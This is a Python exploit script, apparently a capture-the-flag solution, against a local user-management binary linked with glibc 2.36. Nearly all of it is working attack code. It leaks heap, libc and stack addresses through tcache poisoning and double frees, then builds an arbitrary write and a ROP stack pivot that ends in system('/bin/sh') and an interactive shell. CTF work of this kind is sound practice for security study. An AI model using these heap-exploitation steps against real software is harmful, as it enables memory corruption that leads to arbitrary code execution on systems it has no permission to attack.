from ptrlib import *

# I use red.pwn libc.so.6 by mistake
# GNU C Library (Debian GLIBC 2.36-9) stable release version 2.36.
# md5sum ./libc.so.6
# 9e21f348e8bd0dfd8d535eaf6fa9eb71  ./libc.so.6
libc = ELF('./libc.so.6')
io = Process('./run')
#io = remote('nc localhost 1337')

def restart_menu():
    io.sendlineafter("> ", 0)
    return

def restart_main():
    io.sendlineafter("> ", 1)
    return

def new_user(username, password, line=False):
    io.sendlineafter("> ", 2)
    if (line):
        io.sendafter("> ", username)
    else:
        io.sendlineafter("> ", username)
    if (line):
        io.sendafter("> ", password)
    else:
        io.sendlineafter("> ", password)
    return
    
def delete_user(username):
    io.sendlineafter("> ", 3)
    io.sendlineafter("> ", username)
    return

def change_pass(username, password):
    io.sendlineafter("> ", 4)
    io.sendlineafter("> ", username)
    io.sendlineafter("> ", password)
    return

def view_user():
    io.sendlineafter("> ", 5)
    return

def exit():
    io.sendlineafter("> ", 6)
    return


# leak heap addr
new_user("test","leakheap")
view_user()
io.recvuntil("leakheap")
heap_addr = u64(io.recvline())
print("[+] leak heap addr " + hex(heap_addr))


change_pass("test", "test")
delete_user("test")
delete_user("root")
# overwrite tcache key
tcache_addr_user = p64(heap_addr >> 12 ^ (heap_addr + 0x1d0))[:-2]
change_pass(tcache_addr_user, "tttt")
# double free
delete_user(tcache_addr_user)
poisoning_user = p64(heap_addr >> 12 ^ (heap_addr+0x280))[:-2]
new_user(poisoning_user, "1")
new_user("test","1")

# allocate chunk over chunk size metadata
new_user("target",p64(0x91))

# extend heap space to make fake unsorted bin
for i in range(0, 30):
    if (i == 3):
        new_user(p64(heap_addr)[:-2],p64(heap_addr+0x200)[:-2])
        continue
    new_user("kkkk"+str(i),"pppp")
# overwrite chunk size
change_pass("target", p64(0x4e1))
# free overwritten size chunk -> unsorted bins
delete_user(p64(heap_addr)[:-2])
# allocate chunks from fake unsorted bins and overlap libc_address and valid chunk
for i in range(0, 27):
    if (i == 0):
        new_user(str(i), p64(heap_addr+0x290))
        continue
    new_user("libc"+str(i), "")
# leak libc addr
view_user()
io.recvuntil("libc24:")
io.recvline()
libc.base = u64(b"\x00" + io.recvline()) - 0x1d2c00
print("[+] leak libc addr " + hex(libc.base))

# new heap memory
restart_main()
new_user("test","kkkkpppp")
delete_user("test")
delete_user("root")
# overwrite tcache key
tcache_addr_user = p64(heap_addr >> 12 ^ (heap_addr + 0x9a0))[:-2]
change_pass(tcache_addr_user, "tttt")
# double free
delete_user(tcache_addr_user)
# allocate chunk under environ
poisoning_user = p64(heap_addr >> 12 ^ (libc.symbol('environ') + 0x10))[:-2]
new_user(poisoning_user, "1")
new_user("test","1")
# store heap address under environ
new_user(p64(heap_addr-0x370+0xb40)[:-2], p64(heap_addr-0x370+0xb40))
new_user("kk","1")
delete_user("kk")
delete_user("test")
tcache_addr_user = p64(heap_addr >> 12 ^ (heap_addr-0x370+0xd40))[:-2]
change_pass(tcache_addr_user, "tttt")
# double free
delete_user(tcache_addr_user)
# allocate chunk over view_user fd, bk metadata
poisoning_user = p64(heap_addr >> 12 ^ (heap_addr-0x370+0xb50))[:-2]
new_user(poisoning_user, "1")
new_user("test","1")
# overwrite fd, bk metadata and connect environ address to view_user double linked list
new_user(p64(libc.symbol('environ'))[:-2], p64(libc.symbol('environ')))

# leak stack address
view_user()
io.recvline()
stack_addr = u64(io.recvuntil(":")[:-1])
print("[+] leak stack addr " + hex(stack_addr))

def aaw(before_chunk_addr, target_addr, username, password):
    tcache_addr_user = p64((before_chunk_addr-0x170) >> 12 ^ (before_chunk_addr))[:-2]
    new_user("before", "1")
    delete_user("before")
    delete_user("root")
    change_pass(tcache_addr_user, "tttt")
    delete_user(tcache_addr_user)
    poisoning_user = p64((before_chunk_addr-0x170) >> 12 ^ target_addr)[:-2]
    new_user(poisoning_user, "1")
    # write rop payload for using after stack pivot
    new_user(p64(next(libc.gadget("ret;"))),p64(next(libc.gadget("pop rdi; pop rbp; ret;"))), True)
    new_user(username, password, True)
    return

input("> ")
restart_main()
index = 0
target = heap_addr + 0x200 + 0xa20
bf_addr = heap_addr-0x370+0xf40
aaw(bf_addr, target, p64(libc.symbol('system')), p64(0xd1))

# overwrite return address and trigger stack pivot
restart_main()
target = stack_addr - 0x148
bf_addr += 0x200
# stack chunk username to /bin/sh
payload = b"/bin/sh\x00"
# 'pop rsp; ret;' pop view_user fd -> stack pivot
payload += p64(next(libc.gadget("pop rsp; ret;")))
aaw(bf_addr, target, payload[index:index+8],payload[index+8:index+16])
# after stack pivot

#-------------------------------
# username ("ret;") <- $rsp
#-------------------------------
# target ("pop rdi; pop rbp; ret;")
#-------------------------------
# view_user fd (stack username addr (username is /bin/sh))
#-------------------------------
# view_user bk
#-------------------------------
# libc.symbol('system')
#-------------------------------

io.interactive()
